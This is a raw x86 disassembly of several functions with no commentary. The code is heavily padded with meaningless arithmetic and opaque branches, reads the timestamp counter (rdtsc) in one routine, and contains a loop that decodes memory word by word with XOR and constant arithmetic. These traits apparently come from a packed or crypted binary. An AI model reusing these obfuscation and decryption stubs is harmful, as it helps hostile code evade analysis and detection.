  40783f:	sub    ecx,0x3ddba27c
  407845:	xor    ebx,ebx
  407847:	cmp    esi,0x62
  40784a:	jne    0x40787a
  40784c:	mov    ebx,eax
  40784e:	sub    DWORD PTR [ebp-0x4],ecx
  407851:	and    ebx,eax
  407853:	mov    esi,0x61
  407858:	sub    DWORD PTR [ebp-0x4],ebx
  40785b:	sub    esi,edi
  40785d:	cmp    esi,0x35420004
  407863:	je     0x40787a
  407865:	mov    ebx,DWORD PTR [ebp-0x4]
  407868:	cmp    esi,DWORD PTR [ebp-0x20]
  40786b:	je     0x40787a
  40786d:	or     ebx,eax
  40786f:	add    DWORD PTR [ebp-0x4],ebx
  407872:	cmp    edi,DWORD PTR [ebp-0x30]
  407875:	je     0x40787a
  407877:	sub    DWORD PTR [ebp-0x4],esi
  40787a:	cmp    ecx,0xfc24cc84
  407880:	jne    0x407817
  407882:	mov    ebx,DWORD PTR [ebp-0x4]
  407885:	or     DWORD PTR [ebp-0x4],ebx
  407888:	mov    ecx,DWORD PTR [edx+0x4]
  40788b:	sub    DWORD PTR [ebp-0x4],ecx
  40788e:	sub    DWORD PTR [ebp-0x48],ecx
  407891:	mov    DWORD PTR [ebp-0x4],edx
  407894:	add    edi,edx
  407896:	or     DWORD PTR [ebp-0x4],edi
  407899:	mov    eax,DWORD PTR [ebp+0xc]
  40789c:	mov    esi,DWORD PTR ds:0x435450
  4078a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4078a5:	and    esi,edx
  4078a7:	test   eax,0x8d
  4078ac:	jne    0x4078cd
  4078ae:	mov    edi,0x3f
  4078b3:	sub    edi,esi
  4078b5:	cmp    ecx,0xf2ed
  4078bb:	je     0x4078cd
  4078bd:	cmp    edi,DWORD PTR ds:0x435444
  4078c3:	je     0x4078cd
  4078c5:	mov    DWORD PTR [ebp-0x4],edi
  4078c8:	add    ecx,ecx
  4078ca:	add    DWORD PTR [ebp-0x4],ecx
  4078cd:	mov    edi,DWORD PTR [ebp-0x48]
  4078d0:	cmp    edi,DWORD PTR ds:0x43543c
  4078d6:	je     0x40790e
  4078d8:	cmp    edi,DWORD PTR ds:0x435454
  4078de:	je     0x40790e
  4078e0:	and    edx,edi
  4078e2:	mov    esi,DWORD PTR [ebp-0x4]
  4078e5:	add    esi,edx
  4078e7:	xor    ebx,ebx
  4078e9:	sub    esi,edx
  4078eb:	test   esi,0x4671
  4078f1:	jne    0x40790e
  4078f3:	mov    ecx,edx
  4078f5:	mov    edx,DWORD PTR [ebp-0x4]
  4078f8:	sub    esi,edi
  4078fa:	sub    ebx,eax
  4078fc:	add    esi,ecx
  4078fe:	add    DWORD PTR [ebp-0x4],esi
  407901:	add    ebx,edi
  407903:	and    ebx,edx
  407905:	sub    ebx,edx
  407907:	add    ebx,edx
  407909:	add    ebx,edx
  40790b:	or     DWORD PTR [ebp-0x4],ebx
  40790e:	mov    DWORD PTR [eax+0x0],edi
  407911:	add    ebx,ecx
  407913:	cmp    ebx,edi
  407915:	jne    0x40795f
  407917:	add    ebx,ebx
  407919:	mov    esi,DWORD PTR [ebp-0x4]
  40791c:	mov    edi,DWORD PTR ds:0x43543c
  407922:	sub    esi,ebx
  407924:	cmp    ecx,edx
  407926:	je     0x40795f
  407928:	sub    DWORD PTR [ebp-0x4],edx
  40792b:	add    DWORD PTR [ebp-0x4],esi
  40792e:	mov    ecx,DWORD PTR [ebp-0x4]
  407931:	mov    esi,edi
  407933:	cmp    ecx,0x9e29
  407939:	jne    0x40795f
  40793b:	add    ecx,edi
  40793d:	mov    eax,0x70
  407942:	mov    ebx,DWORD PTR ds:0x435428
  407948:	and    ecx,esi
  40794a:	and    DWORD PTR [ebp-0x4],ecx
  40794d:	sub    ebx,esi
  40794f:	sub    DWORD PTR [ebp-0x4],ebx
  407952:	cmp    ecx,DWORD PTR ds:0x43543c
  407958:	je     0x40795f
  40795a:	sub    eax,ecx
  40795c:	sub    DWORD PTR [ebp-0x4],eax
  40795f:	add    DWORD PTR [ebp-0x4],esi
  407962:	pop    edi
  407963:	cmp    edi,DWORD PTR ds:0x435444
  407969:	je     0x40796e
  40796b:	sub    DWORD PTR [ebp-0x4],eax
  40796e:	pop    esi
  40796f:	sub    DWORD PTR [ebp-0x4],esi
  407972:	pop    ebx
  407973:	mov    eax,DWORD PTR ds:0x43543c
  407979:	sub    DWORD PTR [ebp-0x4],eax
  40797c:	leave  
  40797d:	ret    0x8
  407980:	int3   
  407981:	int3   
  407982:	int3   
  407983:	int3   
  407984:	int3   
  407985:	push   ebp
  407986:	mov    ebp,esp
  407988:	sub    esp,0x38
  40798b:	mov    eax,DWORD PTR ds:0x435418
  407991:	xor    ecx,ecx
  407993:	mov    DWORD PTR [ebp-0x1c],eax
  407996:	add    DWORD PTR [ebp-0x1c],eax
  407999:	or     ecx,eax
  40799b:	or     eax,ecx
  40799d:	add    ecx,ecx
  40799f:	sub    DWORD PTR [ebp-0x1c],ecx
  4079a2:	xor    DWORD PTR [ebp-0x1c],ecx
  4079a5:	sub    eax,ecx
  4079a7:	sub    DWORD PTR [ebp-0x1c],eax
  4079aa:	push   ebx
  4079ab:	mov    edx,0x5d62
  4079b0:	add    DWORD PTR [ebp-0x1c],edx
  4079b3:	push   esi
  4079b4:	add    DWORD PTR [ebp-0x1c],ecx
  4079b7:	push   edi
  4079b8:	xor    edi,edi
  4079ba:	mov    esi,0xb6
  4079bf:	sub    DWORD PTR [ebp-0x1c],esi
  4079c2:	add    edi,ecx
  4079c4:	and    edi,edx
  4079c6:	sub    DWORD PTR [ebp-0x1c],edi
  4079c9:	mov    eax,edi
  4079cb:	mov    edi,0x55200105
  4079d0:	and    edi,esi
  4079d2:	add    DWORD PTR [ebp-0x1c],edi
  4079d5:	add    eax,eax
  4079d7:	add    DWORD PTR [ebp-0x1c],edi
  4079da:	sub    DWORD PTR [ebp-0x1c],ecx
  4079dd:	or     eax,ecx
  4079df:	add    DWORD PTR [ebp-0x1c],eax
  4079e2:	sub    esi,edi
  4079e4:	mov    edi,DWORD PTR ds:0x435434
  4079ea:	sub    DWORD PTR [ebp-0x1c],esi
  4079ed:	sub    edi,esi
  4079ef:	and    edi,esi
  4079f1:	mov    DWORD PTR [ebp-0x38],edx
  4079f4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4079f7:	sub    edi,eax
  4079f9:	cmp    ebx,DWORD PTR [ebp-0x4]
  4079fc:	je     0x407a10
  4079fe:	mov    ecx,DWORD PTR [ebp-0x38]
  407a01:	add    ebx,ecx
  407a03:	mov    ecx,DWORD PTR [ebp-0x1c]
  407a06:	add    ebx,edx
  407a08:	add    ebx,edi
  407a0a:	add    DWORD PTR [ebp-0x38],ebx
  407a0d:	or     DWORD PTR [ebp-0x38],ecx
  407a10:	rdtsc  
  407a12:	mov    edi,DWORD PTR [ebp-0x38]
  407a15:	mov    ecx,DWORD PTR [ebp-0x38]
  407a18:	and    ecx,edx
  407a1a:	or     DWORD PTR [ebp-0x1c],eax
  407a1d:	sub    DWORD PTR [ebp-0x1c],edi
  407a20:	and    ecx,esi
  407a22:	and    ecx,edi
  407a24:	mov    DWORD PTR [ebp-0x1c],ecx
  407a27:	sub    esi,edx
  407a29:	mov    ebx,DWORD PTR ds:0x435418
  407a2f:	mov    ecx,DWORD PTR [ebp-0x38]
  407a32:	sub    ecx,edi
  407a34:	xor    DWORD PTR [ebp-0x1c],ecx
  407a37:	sub    DWORD PTR [ebp-0x1c],esi
  407a3a:	and    esi,ebx
  407a3c:	sub    esi,edi
  407a3e:	sub    esi,edi
  407a40:	sub    DWORD PTR [ebp-0x1c],esi
  407a43:	mov    ebx,DWORD PTR [ebp-0x1c]
  407a46:	mov    esi,eax
  407a48:	and    ebx,ecx
  407a4a:	cmp    ebx,DWORD PTR ds:0x435434
  407a50:	je     0x407a58
  407a52:	add    DWORD PTR [ebp-0x1c],ebx
  407a55:	sub    DWORD PTR [ebp-0x1c],esi
  407a58:	pop    edi
  407a59:	add    DWORD PTR [ebp-0x38],edi
  407a5c:	pop    esi
  407a5d:	xor    ebx,ebx
  407a5f:	and    ebx,ecx
  407a61:	add    ebx,ecx
  407a63:	add    ebx,edx
  407a65:	sub    ebx,eax
  407a67:	mov    ecx,0x88
  407a6c:	cmp    ebx,DWORD PTR [ebp-0xc]
  407a6f:	jne    0x407a95
  407a71:	cmp    esi,ebx
  407a73:	je     0x407a95
  407a75:	sub    DWORD PTR [ebp-0x38],ebx
  407a78:	mov    edx,DWORD PTR ds:0x435434
  407a7e:	xor    ebx,ebx
  407a80:	or     DWORD PTR [ebp-0x38],ebx
  407a83:	sub    ecx,edx
  407a85:	and    ecx,edx
  407a87:	sub    DWORD PTR [ebp-0x38],esi
  407a8a:	sub    DWORD PTR [ebp-0x38],eax
  407a8d:	and    edx,eax
  407a8f:	sub    DWORD PTR [ebp-0x38],edx
  407a92:	sub    DWORD PTR [ebp-0x38],ecx
  407a95:	pop    ebx
  407a96:	xor    ecx,ecx
  407a98:	or     ecx,esi
  407a9a:	cmp    ecx,0x3a
  407a9d:	je     0x407ada
  407a9f:	mov    edx,DWORD PTR [ebp-0x38]
  407aa2:	sub    ecx,esi
  407aa4:	or     ecx,edi
  407aa6:	add    DWORD PTR [ebp-0x38],ebx
  407aa9:	and    DWORD PTR [ebp-0x1c],ecx
  407aac:	test   edx,0x175b
  407ab2:	je     0x407ada
  407ab4:	mov    ecx,DWORD PTR [ebp-0x38]
  407ab7:	add    DWORD PTR [ebp-0x38],esi
  407aba:	cmp    ebx,0x578c
  407ac0:	je     0x407ada
  407ac2:	or     ecx,edx
  407ac4:	cmp    ecx,DWORD PTR [ebp-0x30]
  407ac7:	je     0x407ada
  407ac9:	mov    edx,0x58
  407ace:	add    edx,esi
  407ad0:	sub    DWORD PTR [ebp-0x1c],ecx
  407ad3:	and    edx,edi
  407ad5:	add    edx,edi
  407ad7:	add    DWORD PTR [ebp-0x1c],edx
  407ada:	leave  
  407adb:	ret    
  407adc:	int3   
  407add:	int3   
  407ade:	int3   
  407adf:	int3   
  407ae0:	int3   
  407ae1:	push   ebp
  407ae2:	mov    ebp,esp
  407ae4:	sub    esp,0x24
  407ae7:	mov    eax,0xff
  407aec:	mov    ecx,0x43fc
  407af1:	and    eax,ecx
  407af3:	sub    eax,ecx
  407af5:	add    eax,ecx
  407af7:	add    eax,ecx
  407af9:	and    eax,ecx
  407afb:	add    eax,eax
  407afd:	mov    DWORD PTR [ebp-0x24],eax
  407b00:	push   ebx
  407b01:	add    DWORD PTR [ebp-0x24],ecx
  407b04:	push   esi
  407b05:	mov    ebx,DWORD PTR [ebp-0x24]
  407b08:	test   ebx,0x311b
  407b0e:	je     0x407b3d
  407b10:	cmp    ebx,eax
  407b12:	je     0x407b3d
  407b14:	mov    eax,0x3d74
  407b19:	xor    esi,esi
  407b1b:	cmp    ebx,esi
  407b1d:	jne    0x407b3d
  407b1f:	mov    esi,DWORD PTR [ebp-0x24]
  407b22:	mov    ecx,eax
  407b24:	cmp    ebx,0xfffffff9
  407b27:	jne    0x407b3d
  407b29:	sub    DWORD PTR [ebp-0x24],esi
  407b2c:	sub    ebx,ecx
  407b2e:	and    ebx,esi
  407b30:	sub    ebx,esi
  407b32:	cmp    ebx,0x9013
  407b38:	je     0x407b3d
  407b3a:	xor    DWORD PTR [ebp-0x24],ebx
  407b3d:	push   edi
  407b3e:	mov    ebx,DWORD PTR [ebp-0x24]
  407b41:	and    ebx,ecx
  407b43:	mov    edx,0xc3
  407b48:	and    edx,eax
  407b4a:	mov    DWORD PTR [ebp-0x24],ebx
  407b4d:	add    esi,eax
  407b4f:	sub    DWORD PTR [ebp-0x24],eax
  407b52:	and    DWORD PTR [ebp-0x24],eax
  407b55:	add    esi,esi
  407b57:	cmp    esi,0x21
  407b5a:	je     0x407bc2
  407b5c:	add    DWORD PTR [ebp-0x24],edx
  407b5f:	mov    ebx,esi
  407b61:	and    ebx,esi
  407b63:	cmp    ebx,0x52
  407b66:	je     0x407bc2
  407b68:	cmp    esi,0xffffff9d
  407b6b:	jne    0x407bc2
  407b6d:	and    ebx,edx
  407b6f:	mov    esi,DWORD PTR [ebp-0x24]
  407b72:	sub    ebx,esi
  407b74:	sub    ebx,edx
  407b76:	sub    DWORD PTR [ebp-0x24],esi
  407b79:	mov    edi,DWORD PTR [ebp-0x24]
  407b7c:	add    edi,ecx
  407b7e:	test   edi,0xb8b8
  407b84:	je     0x407bc2
  407b86:	cmp    esi,0x6f
  407b89:	jne    0x407bc2
  407b8b:	mov    esi,DWORD PTR [ebp-0x24]
  407b8e:	sub    DWORD PTR [ebp-0x24],ebx
  407b91:	cmp    esi,0xffffffe7
  407b94:	je     0x407bc2
  407b96:	test   esi,0x1a
  407b9c:	jne    0x407bc2
  407b9e:	add    esi,ecx
  407ba0:	add    esi,ecx
  407ba2:	add    edi,ebx
  407ba4:	and    edi,eax
  407ba6:	add    edi,esi
  407ba8:	cmp    edi,0x1a92
  407bae:	jne    0x407bc2
  407bb0:	mov    edx,DWORD PTR [ebp-0x24]
  407bb3:	mov    eax,edx
  407bb5:	sub    eax,edx
  407bb7:	mov    DWORD PTR [ebp-0x24],esi
  407bba:	add    edi,esi
  407bbc:	mov    DWORD PTR [ebp-0x24],edi
  407bbf:	add    DWORD PTR [ebp-0x24],eax
  407bc2:	mov    edx,0x2b
  407bc7:	mov    edi,0xefca
  407bcc:	sub    DWORD PTR [ebp-0x24],edx
  407bcf:	xor    DWORD PTR [ebp-0x24],edi
  407bd2:	mov    eax,DWORD PTR [ebp+0x10]
  407bd5:	sub    DWORD PTR [ebp-0x24],eax
  407bd8:	mov    edx,DWORD PTR [ebp+0x8]
  407bdb:	sub    DWORD PTR [ebp-0x24],edx
  407bde:	cmp    DWORD PTR [ebp+0xc],eax
  407be1:	je     0x407c9f
  407be7:	cmp    ebx,0x6d02
  407bed:	jne    0x407c7b
  407bf3:	mov    ebx,DWORD PTR [ebp-0x24]
  407bf6:	test   esi,0x377b
  407bfc:	jne    0x407c7b
  407bfe:	cmp    ebx,0x17
  407c01:	je     0x407c7b
  407c03:	xor    ecx,ecx
  407c05:	mov    esi,DWORD PTR [ebp-0x24]
  407c08:	test   eax,0x55
  407c0d:	je     0x407c7b
  407c0f:	add    DWORD PTR [ebp-0x24],esi
  407c12:	mov    esi,DWORD PTR [ebp-0x24]
  407c15:	cmp    esi,edi
  407c17:	jne    0x407c7b
  407c19:	add    ecx,edx
  407c1b:	mov    edi,DWORD PTR [ebp-0x24]
  407c1e:	cmp    ebx,0xfffffffc
  407c21:	jne    0x407c7b
  407c23:	add    DWORD PTR [ebp-0x24],esi
  407c26:	or     ecx,esi
  407c28:	add    ebx,edi
  407c2a:	mov    esi,DWORD PTR [ebp-0x24]
  407c2d:	sub    DWORD PTR [ebp-0x24],edx
  407c30:	or     DWORD PTR [ebp-0x24],esi
  407c33:	cmp    ebx,DWORD PTR [ebp-0x8]
  407c36:	je     0x407c7b
  407c38:	mov    edi,0xcd
  407c3d:	mov    esi,DWORD PTR ds:0x43541c
  407c43:	cmp    ecx,esi
  407c45:	jne    0x407c7b
  407c47:	sub    DWORD PTR [ebp-0x24],ecx
  407c4a:	mov    ecx,DWORD PTR [ebp-0x24]
  407c4d:	sub    DWORD PTR [ebp-0x24],ecx
  407c50:	test   ebx,0xef
  407c56:	jne    0x407c7b
  407c58:	mov    DWORD PTR [ebp-0x24],esi
  407c5b:	add    DWORD PTR [ebp-0x24],ebx
  407c5e:	mov    ebx,DWORD PTR [ebp-0x24]
  407c61:	mov    ecx,DWORD PTR ds:0x43541c
  407c67:	and    edi,ebx
  407c69:	add    DWORD PTR [ebp-0x24],edi
  407c6c:	and    ecx,edx
  407c6e:	add    ecx,edx
  407c70:	cmp    edi,eax
  407c72:	jne    0x407c7b
  407c74:	sub    ecx,esi
  407c76:	add    ecx,esi
  407c78:	add    DWORD PTR [ebp-0x24],ecx
  407c7b:	dec    DWORD PTR [ebp+0xc]
  407c7e:	add    ecx,eax
  407c80:	sub    DWORD PTR [ebp-0x24],ecx
  407c83:	xor    DWORD PTR [edx],eax
  407c85:	sub    DWORD PTR [edx],0xe98aa08a
  407c8b:	add    DWORD PTR [edx],0xe503ce75
  407c91:	sub    DWORD PTR [edx],0x3de37f58
  407c97:	add    edx,0x4
  407c9a:	jmp    0x407bdb
  407c9f:	mov    eax,DWORD PTR [ebp-0x24]
  407ca2:	and    DWORD PTR [ebp-0x24],eax
  407ca5:	or     DWORD PTR [ebp-0x24],eax
  407ca8:	mov    DWORD PTR [ebp-0x20],eax
  407cab:	pop    edi
  407cac:	cmp    edi,DWORD PTR [ebp-0x20]
  407caf:	jne    0x407cbe
  407cb1:	cmp    edi,0xffffffcf
  407cb4:	je     0x407cbe
  407cb6:	mov    ecx,0x1340
  407cbb:	sub    DWORD PTR [ebp-0x24],ecx
  407cbe:	pop    esi
  407cbf:	add    DWORD PTR [ebp-0x20],esi
  407cc2:	pop    ebx
  407cc3:	add    ecx,esi
  407cc5:	sub    ecx,edi
  407cc7:	mov    eax,0x95bc
  407ccc:	add    eax,eax
  407cce:	xor    edx,edx
  407cd0:	add    edx,eax
  407cd2:	add    DWORD PTR [ebp-0x20],edx
  407cd5:	mov    DWORD PTR [ebp-0x10],ecx
  407cd8:	leave  
  407cd9:	ret    0xc
  407cdc:	int3   
  407cdd:	int3   
  407cde:	int3   
  407cdf:	int3   
  407ce0:	int3   
  407ce1:	push   ebp
  407ce2:	mov    ebp,esp
  407ce4:	sub    esp,0x4c
  407ce7:	xor    edx,edx
  407ce9:	mov    DWORD PTR [ebp-0x14],edx
  407cec:	push   ebx
  407ced:	xor    DWORD PTR [ebp-0x14],edx
  407cf0:	push   esi
  407cf1:	mov    edx,DWORD PTR [ebp-0x14]
  407cf4:	xor    esi,esi
  407cf6:	sub    esi,edx
  407cf8:	sub    esi,edx
  407cfa:	cmp    esi,0xffffffc5
  407cfd:	jne    0x407d04
  407cff:	add    esi,esi
  407d01:	xor    DWORD PTR [ebp-0x14],esi
  407d04:	push   edi
  407d05:	xor    edx,edx
  407d07:	xor    ecx,ecx
  407d09:	sub    ecx,edx
  407d0b:	add    edx,ecx
  407d0d:	cmp    esi,0xd0b9
  407d13:	je     0x407d18
  407d15:	and    DWORD PTR [ebp-0x14],edx
  407d18:	mov    edi,0x80
  407d1d:	sub    DWORD PTR [ebp-0x14],edi
  407d20:	mov    eax,0xfdc11859
  407d25:	and    edx,eax
  407d27:	mov    ebx,0x1d
  407d2c:	mov    ecx,0x1f1c
  407d31:	sub    edx,ebx
  407d33:	and    ecx,ebx
  407d35:	add    ecx,esi
  407d37:	and    DWORD PTR [ebp-0x14],ecx
  407d3a:	sub    edx,ebx
  407d3c:	xor    DWORD PTR [ebp-0x14],edx
  407d3f:	sub    eax,0xfdc11819
  407d44:	mov    edi,0x63d3
  407d49:	mov    ecx,edi
  407d4b:	add    ecx,esi
  407d4d:	add    ecx,edx
  407d4f:	add    ecx,eax
  407d51:	test   ecx,0xc6e6
  407d57:	je     0x407d5e
  407d59:	add    ecx,eax
  407d5b:	add    DWORD PTR [ebp-0x14],ecx
  407d5e:	push   eax
  407d5f:	cmp    ecx,0x46
  407d62:	je     0x407d7c
  407d64:	sub    edx,eax
  407d66:	mov    eax,ecx
  407d68:	mov    edi,DWORD PTR [ebp-0x14]
  407d6b:	and    edx,esi
  407d6d:	mov    DWORD PTR [ebp-0x18],eax
  407d70:	sub    edx,esi
  407d72:	add    edi,ecx
  407d74:	sub    edi,esi
  407d76:	add    DWORD PTR [ebp-0x18],edi
  407d79:	sub    DWORD PTR [ebp-0x14],edx
  407d7c:	mov    esi,0xc793b3fe
  407d81:	sub    edi,ebx
  407d83:	sub    edi,ebx
  407d85:	or     edi,eax
  407d87:	sub    DWORD PTR [ebp-0x14],edx
  407d8a:	cmp    edi,0xffffffb9
  407d8d:	jne    0x407dec
  407d8f:	mov    ecx,DWORD PTR [ebp-0x14]
  407d92:	sub    edi,edx
  407d94:	add    DWORD PTR [ebp-0x14],ecx
  407d97:	mov    ecx,DWORD PTR [ebp-0x14]
  407d9a:	or     ecx,edx
  407d9c:	add    DWORD PTR [ebp-0x14],esi
  407d9f:	cmp    edi,0xffffffd0
  407da2:	je     0x407dec
  407da4:	mov    ebx,DWORD PTR [ebp-0x14]
  407da7:	mov    eax,edx
  407da9:	sub    DWORD PTR [ebp-0x14],edi
  407dac:	cmp    edi,DWORD PTR [ebp-0x38]
  407daf:	je     0x407dec
  407db1:	sub    ecx,edx
  407db3:	mov    edi,DWORD PTR [ebp-0x14]
  407db6:	xor    edx,edx
  407db8:	add    edi,edi
  407dba:	sub    DWORD PTR [ebp-0x14],edx
  407dbd:	add    ebx,ebx
  407dbf:	add    DWORD PTR [ebp-0x14],ebx
  407dc2:	sub    eax,ecx
  407dc4:	or     eax,edx
  407dc6:	sub    DWORD PTR [ebp-0x14],ecx
  407dc9:	cmp    edi,eax
  407dcb:	jne    0x407dec
  407dcd:	cmp    edi,0xffffffdb
  407dd0:	jne    0x407dec
  407dd2:	cmp    edi,0xeb96
  407dd8:	jne    0x407dec
  407dda:	sub    edi,eax
  407ddc:	sub    edi,ecx
  407dde:	mov    edx,0x7e
  407de3:	add    DWORD PTR [ebp-0x14],edi
  407de6:	and    DWORD PTR [ebp-0x14],edi
  407de9:	add    DWORD PTR [ebp-0x14],edx
  407dec:	add    esi,0x386c7c02
  407df2:	add    edi,ebx
  407df4:	mov    edx,DWORD PTR [ebp-0x14]
  407df7:	mov    ecx,DWORD PTR [ebp-0x14]
  407dfa:	sub    DWORD PTR [ebp-0x14],edi
  407dfd:	add    edx,ebx
  407dff:	cmp    ecx,0x8a69
  407e05:	je     0x407e29
  407e07:	mov    eax,DWORD PTR [ebp-0x14]
  407e0a:	mov    edi,DWORD PTR [ebp-0x14]
  407e0d:	test   edi,0x85008010
  407e13:	jne    0x407e29
  407e15:	xor    ebx,ebx
  407e17:	and    DWORD PTR [ebp-0x14],ecx
  407e1a:	xor    DWORD PTR [ebp-0x14],edx
  407e1d:	sub    edi,ebx
  407e1f:	sub    DWORD PTR [ebp-0x14],eax
  407e22:	and    edi,edx
  407e24:	sub    edi,esi
  407e26:	add    DWORD PTR [ebp-0x14],edi
  407e29:	push   esi
  407e2a:	sub    edi,ebx
  407e2c:	add    edi,edi
  407e2e:	sub    edi,ecx
  407e30:	mov    DWORD PTR [ebp-0x14],esi
  407e33:	and    edi,eax
  407e35:	sub    edi,eax
  407e37:	add    DWORD PTR [ebp-0x14],esi
  407e3a:	mov    ebx,DWORD PTR [ebp-0x14]
  407e3d:	sub    DWORD PTR [ebp-0x14],ebx
  407e40:	cmp    edi,DWORD PTR [ebp-0x30]
  407e43:	jne    0x407ed3
  407e49:	xor    esi,esi
  407e4b:	mov    ebx,DWORD PTR [ebp-0x14]
  407e4e:	sub    DWORD PTR [ebp-0x14],edi
  407e51:	add    ebx,ebx
  407e53:	cmp    ebx,0xffffff8d
  407e56:	jne    0x407ed3
  407e58:	mov    edx,DWORD PTR [ebp-0x14]
  407e5b:	sub    DWORD PTR [ebp-0x14],esi
  407e5e:	mov    eax,DWORD PTR [ebp-0x14]
  407e61:	add    DWORD PTR [ebp-0x14],edx
  407e64:	test   eax,0xac
  407e69:	jne    0x407ed3
  407e6b:	sub    eax,edi
  407e6d:	mov    edx,DWORD PTR [ebp-0x14]
  407e70:	mov    esi,0x22
  407e75:	add    DWORD PTR [ebp-0x14],edx
  407e78:	add    eax,ebx
  407e7a:	add    esi,eax
  407e7c:	cmp    esi,DWORD PTR [ebp-0x38]
  407e7f:	jne    0x407ed3
  407e81:	add    DWORD PTR [ebp-0x14],eax
  407e84:	cmp    esi,edi
  407e86:	je     0x407ed3
  407e88:	mov    eax,DWORD PTR [ebp-0x14]
  407e8b:	mov    edi,DWORD PTR [ebp-0x14]
  407e8e:	sub    eax,edi
  407e90:	cmp    eax,DWORD PTR [ebp-0x3c]
  407e93:	je     0x407ed3
  407e95:	add    DWORD PTR [ebp-0x14],esi
  407e98:	sub    eax,ebx
  407e9a:	add    eax,eax
  407e9c:	and    eax,edx
  407e9e:	mov    edi,edx
  407ea0:	mov    ebx,DWORD PTR [ebp-0x14]
  407ea3:	cmp    edi,0x39
  407ea6:	je     0x407ed3
  407ea8:	cmp    ebx,0xffffffaa
  407eab:	jne    0x407ed3
  407ead:	xor    DWORD PTR [ebp-0x14],edi
  407eb0:	mov    esi,DWORD PTR [ebp-0x14]
  407eb3:	cmp    ebx,0xffffffb3
  407eb6:	je     0x407ed3
  407eb8:	add    DWORD PTR [ebp-0x14],esi
  407ebb:	cmp    eax,ebx
  407ebd:	je     0x407ed3
  407ebf:	mov    edi,DWORD PTR [ebp-0x14]
  407ec2:	sub    DWORD PTR [ebp-0x14],eax
  407ec5:	cmp    edi,0x23948048
  407ecb:	je     0x407ed3
  407ecd:	xor    DWORD PTR [ebp-0x14],ebx
  407ed0:	sub    DWORD PTR [ebp-0x14],edi
  407ed3:	push   0x5185f
  407ed8:	and    ebx,edi
  407eda:	sub    ebx,ecx
  407edc:	mov    esi,0x61
  407ee1:	mov    eax,DWORD PTR [ebp-0x14]
  407ee4:	test   eax,0x94
  407ee9:	je     0x407f2c
  407eeb:	mov    ecx,DWORD PTR [ebp-0x14]
  407eee:	and    eax,ebx
  407ef0:	cmp    ecx,0x9f61
  407ef6:	je     0x407f2c
  407ef8:	mov    edi,DWORD PTR [ebp-0x14]
  407efb:	mov    ebx,0x35
  407f00:	and    ecx,ebx
  407f02:	sub    edi,ebx
  407f04:	mov    DWORD PTR [ebp-0x14],eax
  407f07:	sub    DWORD PTR [ebp-0x14],edi
  407f0a:	test   ecx,0xfa
  407f10:	je     0x407f2c
  407f12:	test   ecx,0x8f
  407f18:	je     0x407f2c
  407f1a:	mov    eax,DWORD PTR [ebp-0x14]
  407f1d:	add    DWORD PTR [ebp-0x14],ecx
  407f20:	sub    esi,edi
  407f22:	cmp    esi,ebx
  407f24:	je     0x407f2c
  407f26:	add    DWORD PTR [ebp-0x14],eax
  407f29:	sub    DWORD PTR [ebp-0x14],esi
  407f2c:	push   0x0
  407f2e:	cmp    eax,ebx
  407f30:	jne    0x408030
  407f36:	mov    edx,0x9c22
  407f3b:	or     edx,eax
  407f3d:	cmp    edx,eax
  407f3f:	jne    0x408030
  407f45:	mov    ebx,DWORD PTR [ebp-0x14]
  407f48:	and    edx,eax
  407f4a:	mov    edi,DWORD PTR [ebp-0x14]
  407f4d:	sub    DWORD PTR [ebp-0x14],edi
  407f50:	sub    ebx,edx
  407f52:	add    ebx,edx
  407f54:	and    ebx,eax
  407f56:	add    ebx,edi
  407f58:	test   ebx,0x8c
  407f5e:	je     0x408030
  407f64:	mov    edi,DWORD PTR [ebp-0x14]
  407f67:	add    DWORD PTR [ebp-0x14],ecx
  407f6a:	add    DWORD PTR [ebp-0x14],ecx
  407f6d:	xor    eax,eax
  407f6f:	sub    DWORD PTR [ebp-0x14],edi
  407f72:	cmp    ebx,0xffffff89
  407f75:	jne    0x408030
  407f7b:	mov    ecx,0x90
  407f80:	or     ebx,esi
  407f82:	mov    edi,DWORD PTR [ebp-0x14]
  407f85:	add    DWORD PTR [ebp-0x14],ecx
  407f88:	cmp    edi,DWORD PTR [ebp-0x30]
  407f8b:	jne    0x408030
  407f91:	mov    ecx,DWORD PTR [ebp-0x14]
  407f94:	or     ecx,edx
  407f96:	add    ecx,ecx
  407f98:	sub    edi,ecx
  407f9a:	mov    esi,DWORD PTR [ebp-0x14]
  407f9d:	cmp    esi,0xffffff99
  407fa0:	je     0x408030
  407fa6:	and    ebx,edi
  407fa8:	and    eax,esi
  407faa:	add    eax,ecx
  407fac:	sub    eax,esi
  407fae:	and    ebx,ecx
  407fb0:	sub    eax,esi
  407fb2:	mov    esi,DWORD PTR [ebp-0x14]
  407fb5:	mov    ecx,DWORD PTR [ebp-0x14]
  407fb8:	cmp    esi,0xffffffe6
  407fbb:	je     0x408030
  407fbd:	sub    esi,eax
  407fbf:	xor    edi,edi
  407fc1:	mov    DWORD PTR [ebp-0x20],ebx
  407fc4:	test   esi,0x5043a00
  407fca:	je     0x408030
  407fcc:	test   esi,0x30
  407fd2:	je     0x408030
  407fd4:	test   esi,0xa850
  407fda:	je     0x408030
  407fdc:	add    esi,ebx
  407fde:	mov    ebx,0xef
  407fe3:	cmp    ecx,0x40
  407fe6:	jne    0x408030
  407fe8:	test   ecx,0xa1fe
  407fee:	jne    0x408030
  407ff0:	mov    ebx,DWORD PTR [ebp-0x20]
  407ff3:	mov    edi,DWORD PTR [ebp-0x20]
  407ff6:	add    DWORD PTR [ebp-0x14],esi
  407ff9:	sub    edi,esi
  407ffb:	cmp    ecx,ebx
  407ffd:	jne    0x408030
  407fff:	and    DWORD PTR [ebp-0x20],eax
  408002:	cmp    ecx,0xffffffdb
  408005:	jne    0x408030
  408007:	mov    eax,ecx
  408009:	add    DWORD PTR [ebp-0x20],ebx
  40800c:	cmp    edi,DWORD PTR [ebp-0x3c]
  40800f:	jne    0x408030
  408011:	add    DWORD PTR [ebp-0x14],ecx
  408014:	add    edi,eax
  408016:	add    edi,eax
  408018:	add    edi,esi
  40801a:	xor    esi,esi
  40801c:	add    edi,eax
  40801e:	mov    edx,0xbe
  408023:	add    DWORD PTR [ebp-0x14],edi
  408026:	or     edx,ebx
  408028:	sub    DWORD PTR [ebp-0x20],edx
  40802b:	sub    esi,ebx
  40802d:	sub    DWORD PTR [ebp-0x14],esi
  408030:	mov    edi,0x4568a75a
  408035:	mov    eax,DWORD PTR [ebp-0x14]
  408038:	mov    ebx,DWORD PTR [ebp-0x14]
  40803b:	sub    ebx,edx
  40803d:	add    eax,ecx
  40803f:	mov    DWORD PTR [ebp-0x14],eax
